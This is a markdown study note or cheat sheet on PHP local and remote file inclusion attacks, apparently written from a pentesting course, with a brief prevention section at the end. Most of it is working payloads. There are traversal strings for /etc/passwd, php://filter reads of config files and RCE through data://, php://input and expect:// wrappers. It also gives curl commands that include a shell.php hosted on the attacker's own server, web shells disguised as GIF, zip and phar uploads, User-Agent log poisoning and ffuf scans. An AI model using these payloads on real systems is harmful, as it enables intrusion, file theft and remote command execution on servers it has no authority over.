# FILE INCLUSIONS 

If such functionalities are not securely coded, an attacker may manipulate these parameters to display the content of any local file on the hosting server, leading to a Local File Inclusion (LFI) vulnerability.

LFI vulnerabilities can lead to source code disclosure, sensitive data exposure, and even remote code execution under certain conditions

## Path Traversal
absolute path - `/etc/passwd`
relative path - `../../../..//etc/passwd`

## Filename Prefix

    example php code:
    include("lang_" . $_GET['language']);

In this case, if we try to traverse the directory with ../../../etc/passwd, the final string would be lang_../../../etc/passwd, which is invalid:

to bypass this we use prifix `/`

    lang_/../../../../etc/passwd

## Appended Extensions

    example php
    include($_GET['language'] . ".php");

the above result into the `/etc/passwd.php`

## second Order attack 
Exploiting LFI vulnerabilities using second-order attacks is similar to what we have discussed in this section. The only variance is that we need to spot a function that pulls a file based on a value we indirectly control and then try to control that value to exploit the vulnerability.

## bypass filters
**1. Non-Recursive Path Traversal Filters**

    $language = str_replace('../', '', $_GET['language']);         #replace "../" with ""

this may work if the filter is not recrusively remove at output `....//....//....//....//etc/passwd` or  `..././` `....\/` ` ....////` 

**2. Encoding**

If the target web application did not allow `.` and `/` in our input, we can URL encode `../` into `%2e%2e%2f`, which may bypass the filter.

**3. Approved Paths**

Some web applications may also use Regular Expressions to ensure the render file is under the specific directory always eg `./languages`

    if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
        include($_GET['language']);
    } else {
        echo 'Illegal path specified!';
    }

To find the approved path, we can examine the requests sent by the existing forms, and see what path they use for the normal web functionality. Furthermore, we can fuzz web directories under the same path, and try different ones until we get a match. To bypass this, we may use path traversal and start our payload with the approved path, and then use ../ to go back to the root directory and read the file we specify


**4. Appended Extension**
some web applications append an extension to our input string (e.g. .php), to ensure that the file we include is in the expected extension.

**5. Path Truncation**
In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored. 

    ?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]


    echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done

**6. Null Bytes**

PHP versions before 5.5 were vulnerable to null byte injection, which means that adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it. To exploit this vulnerability, we can end our payload with a null byte `(e.g. /etc/passwd%00)`

## PHP Fileters
we are using the [php Wrappers](https://www.php.net/manual/en/wrappers.php.php) to bypass the filter or read the sensitive files. This is not only beneficial with LFI attacks, but also with other web attacks like XXE
**Input Filters** we can access the PHP filter wrapper with `php://filter/`, the main ones we require for our attack are resource and read. There are four different types of filters available for use, which are String Filters, Conversion Filters, Compression Filters, and Encryption Filters the filter that is useful for LFI attacks is the convert.base64-encode filter, under Conversion Filters

fuzz it and know what are file available to availabe with any sensitive information. by using the tools like ffuf or gobuster. and we are intersted in `301`, `302` and `403` as well as `200`.

attack surface - `http://<SERVER_IP>:<PORT>/index.php?language=config`. In this url the .php is appending by the backend server and it passes the `config` means that at the backend it is `config.php` and after requesting this file we see nothing because it has no html to render to the brwser so we are endoding every thing into the `base64` then decode it all to see the file `config.php`.

payload `php://filter/read=convert.base64-encode/resource=config`

## PHP wrapper
**Data**
The `data` wrapper can be used to include external data, including PHP code. data wrapper is only available to use if the (allow_url_include) setting is enabled in the PHP configurations. first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.

`(/etc/php/X.Y/apache2/php.ini)` for Apache or at `(/etc/php/X.Y/fpm/php.ini)` for Nginx, where X.Y is your install PHP version. 

`curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"` using burp or curl because the string is very long and it capture carefully.

Remote Code Execution:  We can also pass it base64 encoded strings with text/plain;base64, and it has the ability to decode them and execute the PHP code.

    echo '<?php system($_GET["cmd"]); ?>' | base64

    curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid

**Input**

the input wrapper also depends on the `allow_url_includ`e setting, the input wrapper as a POST request's data, So, the vulnerable parameter must accept POST requests for this attack to work.

    curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid


**Expect**
as we do previous for the `allow_url_includ` same for the `expect` it must be in active mode to work the vuln.
and with this expect we dont need to pass the webshell because it is made for the execution of the cmd at system level.

    echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
    extension=expect

    payload  
    curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"

## Remote File Inclusion (RFI)

- Enumerating local-only ports and web applications (i.e. SSRF)
- Gaining remote code execution by including a malicious script that we host

Function|	Read Content	|Execute	|Remote URL
|-|-|-|-|
PHP		|	|
include()/include_once()|	✅	|✅|	✅
file_get_contents()	|✅|	❌	|✅
Java		|	|
import|	✅|	✅|	✅
.NET	|		
@Html.RemotePartial()	|✅|	❌|	✅
include|	✅|	✅|	✅

**Verify RFI**
check  allow_url_include is enable or not with the above method.

this is not reliable and not vulnerable to the RFI, more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to try and include a URL, and see if we can get its content. At first, we should always start by trying to include a local URL `http://127.0.0.1:80/index.php` to ensure our attempt does not get blocked by a firewall or other security measures. 

![rfi](image-5.png)

we can see, the index.php page got included in the vulnerable section (i.e. History Description), so the page is indeed vulnerable to RFI

**Remote Code Execution with RFI**
First step in gaining remote code execution is creating a malicious script in the language of the web application.

    echo '<?php system($_GET["cmd"]); ?>' > shell.php

We may host the script through an FTP service or an SMB service.
    
HTTP server

    sudo python3 -m http.server <LISTENING_PORT>

    http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id

FTP server

    sudo python -m pyftpdlib -p 21

    http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id                       #annonymous users
    curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'     #auth users


SMB protocol if the web application is hosted on windows

    impacket-smbserver -smb2support share $(pwd)

    http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami


**NOTE** -  we must note that this technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.

## LFI and File Uploads
`**Image upload**
Crafting Malicious Image

    echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

upload the above payload. and find the path where the image is uploaded.

**Zip Upload**
We can utilize the zip wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work.

    echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php                          #zip everything and payload
    http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id      #call the file with zip function

**Phar Upload**

`shell.php`
    <?php
    $phar = new Phar('shell.phar');
    $phar->startBuffering();
    $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
    $phar->setStub('<?php __HALT_COMPILER(); ?>');

    $phar->stopBuffering();

This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with. We can compile it into a phar file and rename it to shell.jpg as follows:

    php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

upload it

access the file 
    example.
    http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id


## Log Poisoning

that if we include any file that contains PHP code, it will get executed, as long as the vulnerable function has the Execute privileges. Writing PHP code in a field we control that gets logged into a log file (i.e. poison/contaminate the log file), and then include that log file to execute the PHP code. For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another.

**PHP Session Poisoning**
`cookie = <el4ukv0kqbvoirg7nkp4dncpk3>` then the file name for the php is `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3` and saved in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows. 

try:

    http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_mu20uu4gug1f5mbf7723ost8ug

poison

    http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning

confirmation:
    
    http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_mu20uu4gug1f5mbf7723ost8ug

CMD execution

    http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

CLI intraction

    http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_mu20uu4gug1f5mbf7723ost8ug&cmd=id

**Server Log Poisoning**
Both Apache and Nginx maintain various log files, such as access.log and error.log. file contains various information about all requests made to the server, including each request's `User-Agent` header. Nginx logs are readable by low privileged users by default (e.g. www-data), while the Apache logs are only readable by users with high privileges (e.g. root/adm groups). misconfiguration happnes then the apache logs read with low privilege 

By default, Apache logs are located in /var/log/apache2/ on Linux and in C:\xampp\apache\logs\ on Windows, while Nginx logs are located in /var/log/nginx/ on Linux and in C:\nginx\log\ on Windows. 

check

    http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log

we can read the log. The log contains the remote IP address, request page, response code, and the User-Agent header

![burp](image-7.png)

![burp](image-8.png)

Request send by the curel by changing the user-agent:

    curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"

![burp](image-9.png)

-  The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files 
- /var/log/sshd.log
- /var/log/mail
- /var/log/vsftpd.log

## Automated Scanning

identifying exposed parameter:

    ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

fuzz with LFI parameter

    ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

find web root path 

    ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

fuzz for the server log files

    ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

**LFI Tools**

[text](https://github.com/D35m0nd142/LFISuite)
[text](https://github.com/OsandaMalith/LFiFreak)
[text](https://github.com/mzfr/liffy)

## File Inclusion Prevention
1. The most effective thing we can do to reduce file inclusion vulnerabilities is to avoid passing any user-controlled inputs into any file inclusion functions or APIs.
2. we can create a whitelist that contains all existing paths used in the front-end, and then utilize this list to match the user input.
3. The best way to prevent directory traversal is to use your programming language's (or framework's) built-in tool to pull only the filename. For example, PHP has basename(), which will read the path and only return the filename portion.  

**Web Server Configuration**

 In PHP this can be done by setting allow_url_fopen and allow_url_include to Off.
 . The most common way to do this in today's age is by running the application within Docker.

**Web Application Firewall (WAF)**
